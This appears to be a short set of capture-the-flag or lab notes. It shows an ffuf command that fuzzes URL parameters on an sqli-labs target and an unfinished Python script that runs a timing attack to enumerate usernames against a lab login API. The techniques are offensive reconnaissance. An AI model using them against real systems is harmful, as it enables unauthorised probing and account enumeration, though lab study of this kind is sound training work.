#### Fuzzing Parameters

**What is the parameter you found?**  
```
ffuf -u 'http://10.10.226.61/sqli-labs/Less-1/?FUZZ=1' -c -w /root/Downloads/SecLists-master/Discovery/Web-Content/burp-parameter-names.txt -fw 39

```

```
id
```

**What is the highest valid id?**

the seq command generates a series of numbers from 0 to 254 ? 
the -w - command takes that generated number and uses it to fuzz the API

Try to write a script to perform a timing attack.
```
import requests
import time

#doLogin(user)


def doLogin(user): 
	startTime = time.time() * 1000 
	creds = {"username": user, "password": "invalidPassword!"}

	response = requests.post("http://10.10.141.166:80/api/user/login", json=creds)
	endTime = time.time() * 1000
	time_diff = endTime - startTime

	if time_diff > 200: 
		return user, time_diff  
	else: 
		return "None", "None"
		

if __name__ == "__main__": 
	
	with open("names.txt", 'r') as n_file:
